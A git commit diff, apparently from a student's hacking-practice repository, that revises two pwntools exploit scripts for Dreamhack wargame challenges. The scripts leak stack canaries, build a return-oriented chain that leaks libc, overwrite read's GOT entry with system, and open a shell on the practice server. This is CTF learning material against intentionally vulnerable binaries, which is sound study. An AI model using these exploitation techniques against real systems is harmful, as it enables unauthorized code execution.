9511d69c4084f84ac8d49090923eb4ee124c8f19
kkangjane <kkangjane@korea.ac.kr>
2023-11-02 14:06:29 +0900

    ~11/02

--- System Hacking/War game/ROP/own.py
+++ System Hacking/War game/ROP/own.py
@@ -6,46 +6,46 @@ p = remote('host3.dreamhack.games', 14246)
 e = ELF('./rop')
 libc = ELF('./libc.so.6')
 
-buf = b'A' * 0x39
-p.sendafter(b'Buf: ', buf)
-p.recvuntil(buf)
-cnry = u64(b'\x00' + p.recvn(7))
-slog('Canary', cnry)
-
-read_plt = e.plt['read']
-read_got = e.got['read']
-write_plt = e.plt['write']
 pop_rdi = 0x400853
 pop_rsi_r15 = 0x400851
 ret = 0x400854
 
+buf = b'A' * 0x39
+p.sendafter(b'Buf: ', buf)
+p.recvuntil(buf)
+cnry = u64(b'\x00' + p.recvn(7))
+slog('canary', cnry)
+
 payload = b'A' * 0x38 + p64(cnry) + b'B' * 0x8
 
-# write(1, read_got, ...) -> read_got 값을 읽기
+# 우리는 system의 got을 모르기 때문에 일단 read_got을 읽어서 이를 이용하자
+read_plt = e.plt['read']
+read_got = e.got['read']
+write_plt = e.plt['write']
+
+# write(1, read_got, ...)
 payload += p64(pop_rdi) + p64(1)
 payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
 payload += p64(write_plt)
 
-# read(0, read_got, ...) -> 맨 마지막 줄 p.send()에서 system의 주소를 보내기 때문에 read_got이 system 함수의 주소로 바뀐다.
+# read(0, read_got, ...) -> read_got을 system으로 바꾸고 싶어...
 payload += p64(pop_rdi) + p64(0)
 payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
-payload += p64(read_got)
+payload += p64(read_plt)
 
 # read("/bin/sh")->system("/bin/sh")
-payload += p64(pop_rdi)
-payload += p64(read_got + 0x8)
+payload += p64(pop_rdi) + p64(read_got + 0x8)
 payload += p64(ret)
 payload += p64(read_plt)
 
-
-p.sendafter(b'Buf', payload)
-read = u64(p.recvn(6) + b'\x00' * 2)
+p.sendafter(b'Buf: ', payload)
+read = u64(p.recvn(6) + b'\x00' * 2) # write(1, read_got, ...)에서 받아옴
 libc_base = read - libc.symbols['read']
 system = libc_base + libc.symbols['system']
+
 slog('read', read)
 slog('system', system)
 slog('libc base', libc_base)
-
-p.send(p64(system) + b'/bin/sh\x00')
+p.sendline(p64(system) + b'/bin/sh\x00')
 
 p.interactive()
--- System Hacking/War game/ssp_001/own.py
+++ System Hacking/War game/ssp_001/own.py
@@ -7,6 +7,27 @@ from pwn import *
 # name - [ebp-0x48]
 # canary = [ebp-0x8]
 
-p = remote('host3.dreamhack.games', 20563)
+p = remote('host3.dreamhack.games', 21239)
+elf = ELF('./ssp_001')
+
+canary = b''
+get_shell = elf.symbols['get_shell']
 
 # read canary
+for i in range(131, 127, -1):
+    p.sendlineafter(b'>', b'P')
+    p.sendlineafter(b'Element index : ', str(i))
+    p.recvuntil(b'is : ')
+    canary += p.recv(2)
+canary = int(canary, 16)
+
+# leak
+p.sendlineafter(b'>', b'E')
+name = b'A' * 0x40
+name += p32(canary)
+name += b'B' * 0x8
+name += p32(get_shell)
+p.sendlineafter(b'Size : ', str(len(name) + 1))
+p.sendlineafter(b'Name : ', name)
+
+p.interactive()
